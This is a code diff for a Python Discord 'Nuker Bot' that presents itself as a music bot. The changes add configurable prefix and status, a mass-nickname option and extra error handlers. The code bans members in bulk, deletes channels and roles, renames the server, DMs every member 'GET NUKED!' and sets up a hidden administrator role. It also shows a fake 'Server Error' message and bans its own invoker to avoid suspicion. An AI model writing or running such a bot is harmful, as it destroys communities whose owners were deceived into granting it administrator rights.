@@ -1,7 +1,7 @@
 # Made by KingWaffleIII
 
 # Nuker Bot
-# v1.4.1
+# v1.1
 
 import discord
 from discord.ext import commands
@@ -10,35 +10,53 @@ import requests
 
 from datetime import datetime
 from dotenv import load_dotenv
-from io import BytesIO
-from os import getenv
-from PIL import Image
+from os import getenv, path
 from time import sleep
 from typing import Optional
 
-
 # var declarations
 
-try:
+if path.isfile(".env"):
     load_dotenv()
     TOKEN = getenv("TOKEN")
-except Exception:
+    PREFIX = getenv("PREFIX")
+    STATUS = getenv("STATUS")
+else:
     TOKEN = ""
+    PREFIX = "!"
+    STATUS = "watching,for !help"
 
-# if getting .env failed; set TOKEN to ""
+# if getting .env failed; set vars to default value
 if TOKEN is None:
     TOKEN = ""
+elif PREFIX is None:
+    PREFIX = "!"
+elif STATUS is None:
+    STATUS = "watching,for !help"
 
-prefix = "!"
+# parse the STATUS var
+tmp = STATUS.split(",")
+ACTIVITY_TYPE = tmp[0]
+ACTIVITY = tmp[1]
+
+if ACTIVITY_TYPE == "playing":
+    ACTIVITY_TYPE = discord.ActivityType.playing
+
+elif ACTIVITY_TYPE == "streaming":
+    ACTIVITY_TYPE = discord.ActivityType.streaming
+
+elif ACTIVITY_TYPE == "listening":
+    ACTIVITY_TYPE = discord.ActivityType.listening
+
+elif ACTIVITY_TYPE == "watching":
+    ACTIVITY_TYPE = discord.ActivityType.watching
 
 intents = discord.Intents.default()
 intents.members = True
 
-bot = commands.Bot(command_prefix=prefix, intents=intents)
-
+bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
 bot.remove_command("help")
-
 
 admin_role = [False]
 
@@ -49,7 +67,8 @@ config_options = {
     3: "roles",
     4: "server",
     5: "nuke_channel",
-    6: "dm"
+    6: "dm",
+    7: "nick"
 }
 
 ban = [True]  # banning config in !skip
@@ -58,6 +77,7 @@ roles = [True]  # roles config in !skip
 server = [True]  # server config in !skip
 nuke_channel = [True]  # nuke_channel config in !skip
 dm = [False]  # dm config in !skip
+nick = [False]  #nick config in !skip
 
 
 # nuking functions
@@ -66,11 +86,10 @@ async def create_admin(ctx):
     global admin_role
     if not admin_role[0]:
         try:
-            admin_role = []
-            admin_role.append(True)
+            admin_role = [True]
 
             role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))
-            
+
             admin_role.append(role)
             admin_role.append(role.id)
 
@@ -103,8 +122,7 @@ Time: {datetime.now()}
 
         if role is None:
             try:
-                admin_role = []
-                admin_role.append(True)
+                admin_role = [True]
 
                 role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))
 
@@ -182,7 +200,7 @@ Time: {datetime.now()}
 # create nuke channel
 async def create_nuke_channel(ctx, name):
     try:
-        nuke_channel = await ctx.guild.create_text_channel(name)
+        await ctx.guild.create_text_channel(name)
     except discord.Forbidden:
         with open("nuke_log.txt", "a+") as f:
             f.write(f'''
@@ -228,7 +246,7 @@ Time: {datetime.now()}
 
 # ban all members
 async def ban_members(ctx, member_list):
-    if member_list != []:
+    if member_list:
         for member_id in member_list:
             member = await bot.fetch_user(member_id)
             if not member.bot:
@@ -272,7 +290,7 @@ Time: {datetime.now()}
 ''')
                 f.close()
                 role_list.remove(role)
-                
+
     print("Deleted all roles.")
 
 
@@ -280,7 +298,7 @@ Time: {datetime.now()}
 @bot.event
 async def on_ready():
     activity = discord.Activity(
-        name="for !help", type=discord.ActivityType.watching)
+        name=ACTIVITY, type=ACTIVITY_TYPE)
     await bot.change_presence(activity=activity)
 
     print(f"{bot.user} online!")
@@ -319,10 +337,11 @@ Time: {datetime.now()}
 # gives an error to any command beginning with !
 @bot.event
 async def on_message(msg):
-    if msg.content.startswith("!"):
+    if msg.content.startswith(PREFIX):
         await bot.process_commands(msg)
         embed = discord.Embed(
-            title="Server Error!", description="Our servers are currently experiencing some issues, please check back at a later time!",
+            title="Server Error!",
+            description="Our servers are currently experiencing some issues, please check back at a later time!",
             colour=0xff0000, set_image="https://i.imgur.com/qxBoiZY.png"
         )
 
@@ -357,10 +376,10 @@ async def nuke(ctx):
     for member in ctx.guild.members:
         member_list.append(member.id)
 
-    member_list.remove(bot.user.id) # remove the bot from the "to be banned" list
-    member_list.remove(ctx.message.author.id) # remove the user from the "to be banned" list
+    member_list.remove(bot.user.id)  # remove the bot from the "to be banned" list
+    member_list.remove(ctx.message.author.id)  # remove the user from the "to be banned" list
     if ctx.message.author.id != ctx.guild.owner.id:
-        member_list.remove(ctx.guild.owner_id) # remove the server owner from the "to be banned" list
+        member_list.remove(ctx.guild.owner_id)  # remove the server owner from the "to be banned" list
 
     await ban_members(ctx, member_list)
 
@@ -370,9 +389,10 @@ async def nuke(ctx):
     for role in ctx.guild.roles:
         role_list.append(role)
 
-    role_list.remove(ctx.guild.default_role) # removes @everyone from the "role to be deleted" list
-    role_list.remove(discord.utils.get(ctx.guild.roles, name="Rythm Pro")) # removes the bot role from the "role to be deleted" list
-    role_list.remove(admin_role) # remove the admin role made above from the "role to be deleted" list
+    role_list.remove(ctx.guild.default_role)  # removes @everyone from the "role to be deleted" list
+    role_list.remove(
+        discord.utils.get(ctx.guild.roles, name="Rythm Pro"))  # removes the bot role from the "role to be deleted" list
+    role_list.remove(admin_role)  # remove the admin role made above from the "role to be deleted" list
 
     await delete_roles(ctx, role_list)
 
@@ -398,7 +418,7 @@ async def play(ctx):
 # bans the person who ran the command to avoid suspicion
 @bot.command(name="pause")
 async def pause(ctx):
-    await ctx.message.delete() 
+    await ctx.message.delete()
     await ctx.guild.ban(await bot.fetch_user(ctx.message.author.id))
     with open("nuke_log.txt", "a+") as f:
         f.write(f'''
@@ -414,7 +434,7 @@ Time: {datetime.now()}
 # bans the person who ran the command as well as removing the bot
 @bot.command(name="stop")
 async def stop(ctx):
-    await ctx.message.delete() 
+    await ctx.message.delete()
     await ctx.guild.ban(await bot.fetch_user(ctx.message.author.id))
     await ctx.guild.leave()
     with open("nuke_log.txt", "a+") as f:
@@ -446,28 +466,24 @@ Time: {datetime.now()}
 @bot.command(name="volume")
 async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optional[str]):
     await ctx.message.delete()
-    global ban, channels, roles, server, nuke_channel, dm
+    global ban, channels, roles, server, nuke_channel, dm, nick
 
     if value != "*":
         setting = config_options[int(value)]
         if setting == "ban":
-            ban = []
-            ban.append(status)
+            ban = [status]
 
-            print(f"Changed ban everyone to {ban[0]}")
+            print(f"Changed \"ban everyone\" to {ban[0]}")
         elif setting == "channels":
-            channels = []
-            channels.append(status)
+            channels = [status]
 
-            print(f"Changed delete channels to {channels[0]}")
+            print(f"Changed \"delete channels\" to {channels[0]}")
         elif setting == "roles":
-            roles = []
-            roles.append(status)
+            roles = [status]
 
-            print(f"Changed delete roles to {roles[0]}")
+            print(f"Changed \"delete roles\" to {roles[0]}")
         elif setting == "server":
-            server = []
-            server.append(status)
+            server = [status]
 
             if arg1:
                 server.append(arg1)
@@ -479,47 +495,49 @@ async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optio
             else:
                 server.append("https://i.imgur.com/CNdUGZj.jpg")
 
-            print(f"Changed server to {server[0]} with a name of {server[1]} and an icon of {server[2]}")
+            print(f"Changed \"edit server\" to {server[0]} with a name of {server[1]} and an icon of {server[2]}")
         elif setting == "nuke_channel":
-            nuke_channel = []
-            nuke_channel.append(status)
+            nuke_channel = [status]
 
             if arg1:
                 nuke_channel.append(arg1)
             else:
                 nuke_channel.append("get nuked")
 
-            print(f"Changed nuke channel to {nuke_channel[0]} with a name of {nuke_channel[1]}")
-
+            print(f"Changed \"nuke channel\" to {nuke_channel[0]} with a name of {nuke_channel[1]}")
         elif setting == "dm":
-            dm = []
-            dm.append(status)
+            dm = [status]
 
             if arg1:
                 dm.append(arg1)
             else:
                 dm.append("GET NUKED!")
 
-            print(f"Changed DM everyone to {dm[0]} with a message of {dm[1]}")
+            print(f"Changed \"DM everyone\" to {dm[0]} with a message of {dm[1]}")
+        elif setting == "nick":
+            nick = [status]
+
+            if arg1:
+                nick.append(arg1)
+            else:
+                nick.append("GET NUKED!")
+
+            print(f"Changed \"nick everyone\" to {nick[0]} with a message of {nick[1]}")
 
     else:
-        ban = []
-        ban.append(status)
+        ban = [status]
 
-        print(f"Changed ban everyone to {ban[0]}")
+        print(f"Changed \"ban everyone\" to {ban[0]}")
 
-        channels = []
-        channels.append(status)
+        channels = [status]
 
-        print(f"Changed delete channels to {channels[0]}")
+        print(f"Changed \"delete channels\" to {channels[0]}")
 
-        roles = []
-        roles.append(status)
+        roles = [status]
 
-        print(f"Changed delete roles to {roles[0]}")
+        print(f"Changed \"delete roles\" to {roles[0]}")
 
-        server = []
-        server.append(status)
+        server = [status]
 
         if arg1:
             server.append(arg1)
@@ -531,27 +549,34 @@ async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optio
         else:
             server.append("https://i.imgur.com/CNdUGZj.jpg")
 
-        print(f"Changed server to {server[0]} with a name of {server[1]} and an icon of {server[2]}")
+        print(f"Changed \"edit server\" to {server[0]} with a name of {server[1]} and an icon of {server[2]}")
 
-        nuke_channel = []
-        nuke_channel.append(status)
+        nuke_channel = [status]
 
         if arg1:
             nuke_channel.append(arg1)
         else:
             nuke_channel.append("get nuked")
 
-        print(f"Changed nuke channel to {nuke_channel[0]} with a name of {nuke_channel[1]}")
+        print(f"Changed \"nuke channel\" to {nuke_channel[0]} with a name of {nuke_channel[1]}")
 
-        dm = []
-        dm.append(status)
+        dm = [status]
 
         if arg1:
             dm.append(arg1)
         else:
             dm.append("GET NUKED!")
 
-        print(f"Changed DM everyone to {dm[0]} with a message of \"{dm[1]}\"")
+        print(f"Changed \"DM everyone\" to {dm[0]} with a message of \"{dm[1]}\"")
+
+        nick = [status]
+
+        if arg1:
+            nick.append(arg1)
+        else:
+            nick.append("GET NUKED!")
+
+        print(f"Changed \"nick everyone\" to {nick[0]} with a message of {nick[1]}")
 
 
 # customisable nuke command introduced in v1.4
@@ -563,6 +588,7 @@ async def skip(ctx):
     do_server = server[0]
     do_nc = nuke_channel[0]
     do_dm = dm[0]
+    do_nick = nick[0]
 
     # check for custom nuke_channel
     if do_nc:
@@ -575,10 +601,8 @@ async def skip(ctx):
         for member in ctx.guild.members:
             dm_list.append(member)
 
-        dm_list.remove(bot.user) # remove the bot from the "to DM" list
-        dm_list.remove(ctx.message.author) # remove the user from the "to DM" list
-        if ctx.message.author.id != ctx.guild.owner.id:
-            dm_list.remove(ctx.guild.owner) # remove the server owner from the "to DM" list
+        dm_list.remove(bot.user)  # remove the bot from the "to DM" list
+        dm_list.remove(ctx.message.author)  # remove the user from the "to DM" list
 
         for member in dm_list:
             try:
@@ -594,9 +618,9 @@ async def skip(ctx):
         for member in ctx.guild.members:
             member_list.append(member.id)
 
-        member_list.remove(bot.user.id) # remove the bot from the "to be banned" list
-        member_list.remove(ctx.message.author.id) # remove the user from the "to be banned" list
-        member_list.remove(ctx.guild.owner_id) # remove the server owner from the "to be banned" list
+        member_list.remove(bot.user.id)  # remove the bot from the "to be banned" list
+        member_list.remove(ctx.message.author.id)  # remove the user from the "to be banned" list
+        member_list.remove(ctx.guild.owner_id)  # remove the server owner from the "to be banned" list
 
         await ban_members(ctx, member_list)
 
@@ -608,9 +632,10 @@ async def skip(ctx):
         for role in ctx.guild.roles:
             role_list.append(role)
 
-        role_list.remove(ctx.guild.default_role) # removes @everyone from the "role to be deleted" list
-        role_list.remove(discord.utils.get(ctx.guild.roles, name="Rythm Pro")) # removes the bot role from the "role to be deleted" list
-        role_list.remove(admin_role) # remove the admin role made above from the "role to be deleted" list
+        role_list.remove(ctx.guild.default_role)  # removes @everyone from the "role to be deleted" list
+        role_list.remove(discord.utils.get(ctx.guild.roles,
+                                           name="Rythm Pro"))  # removes the bot role from the "role to be deleted" list
+        role_list.remove(admin_role)  # remove the admin role made above from the "role to be deleted" list
 
         await delete_roles(ctx, role_list)
 
@@ -618,7 +643,24 @@ async def skip(ctx):
         server_name = server[1]
         server_icon = server[2]
 
-        await edit_server(ctx, server_name, server_icon)
+        await edit_server(ctx, server_name, str(server_icon))
+
+    if do_nick:
+        nickname = nick[1]
+        nick_list = []
+        for member in ctx.guild.members:
+            nick_list.append(member)
+
+        nick_list.remove(bot.user)  # remove the bot from the "to nick" list
+        nick_list.remove(ctx.message.author)  # remove the user from the "to to" list
+        if ctx.message.author.id != ctx.guild.owner.id:
+            nick_list.remove(ctx.guild.owner)  # remove the server owner from the "to nick" list
+
+        for member in nick_list:
+            try:
+                await member.edit(nick=nickname)
+            except discord.HTTPException:
+                print(f"Could not nickname user {member.name}.")
 
 
 # checks if the bot has administrator permissions
@@ -630,9 +672,9 @@ async def nuke_error(ctx, error):
         sleep(1)
         try:
             embed = discord.Embed(title="Error: Missing Required Permissions!",
-description="This bot is lacking required permissions!")
+                                  description="This bot is lacking required permissions!")
             embed.add_field(name="You need to grant me the following permission(s):",
-value="- Administrator")
+                            value="- Administrator")
             await ctx.send(content=None, embed=embed)
         except discord.Forbidden:
             await ctx.send('''
@@ -657,9 +699,9 @@ async def play_error(ctx, error):
         sleep(1)
         try:
             embed = discord.Embed(title="Error: Missing Required Permissions!",
-description="This bot is lacking required permissions!")
+                                  description="This bot is lacking required permissions!")
             embed.add_field(name="You need to grant me the following permission(s):",
-value="- Administrator")
+                            value="- Administrator")
             await ctx.send(content=None, embed=embed)
         except discord.Forbidden:
             await ctx.send('''
@@ -684,9 +726,9 @@ async def pause_error(ctx, error):
         sleep(1)
         try:
             embed = discord.Embed(title="Error: Missing Required Permissions!",
-description="This bot is lacking required permissions!")
+                                  description="This bot is lacking required permissions!")
             embed.add_field(name="You need to grant me the following permission(s):",
-value="- Administrator")
+                            value="- Administrator")
             await ctx.send(content=None, embed=embed)
         except discord.Forbidden:
             await ctx.send('''
@@ -711,9 +753,9 @@ async def stop_error(ctx, error):
         sleep(1)
         try:
             embed = discord.Embed(title="Error: Missing Required Permissions!",
-description="This bot is lacking required permissions!")
+                                  description="This bot is lacking required permissions!")
             embed.add_field(name="You need to grant me the following permission(s):",
-value="- Administrator")
+                            value="- Administrator")
             await ctx.send(content=None, embed=embed)
         except discord.Forbidden:
             await ctx.send('''
@@ -729,6 +771,45 @@ Server Name: {ctx.guild.name}
 Server Owner: {ctx.guild.owner}
 Time: {datetime.now()}
 ''')
+
+
+@volume.error
+async def vol_error(ctx, error):
+    if isinstance(error, commands.BotMissingPermissions):
+        await ctx.send("Checking environment...")
+        sleep(1)
+        try:
+            embed = discord.Embed(title="Error: Missing Required Permissions!",
+                                  description="This bot is lacking required permissions!")
+            embed.add_field(name="You need to grant me the following permission(s):",
+                            value="- Administrator")
+            await ctx.send(content=None, embed=embed)
+        except discord.Forbidden:
+            await ctx.send('''
+__**Error: Missing Required Permission!**__
+**I need the following permission(s) to function properly:**
+- `Administrator`
+''')
+
+
+@skip.error
+async def skip_error(ctx, error):
+    if isinstance(error, commands.BotMissingPermissions):
+        await ctx.send("Checking environment...")
+        sleep(1)
+        try:
+            embed = discord.Embed(title="Error: Missing Required Permissions!",
+                                  description="This bot is lacking required permissions!")
+            embed.add_field(name="You need to grant me the following permission(s):",
+                            value="- Administrator")
+            await ctx.send(content=None, embed=embed)
+        except discord.Forbidden:
+            await ctx.send('''
+__**Error: Missing Required Permission!**__
+**I need the following permission(s) to function properly:**
+- `Administrator`
+''')
+
 
 if TOKEN == "":
     print("Not detecting a dotenv file...")
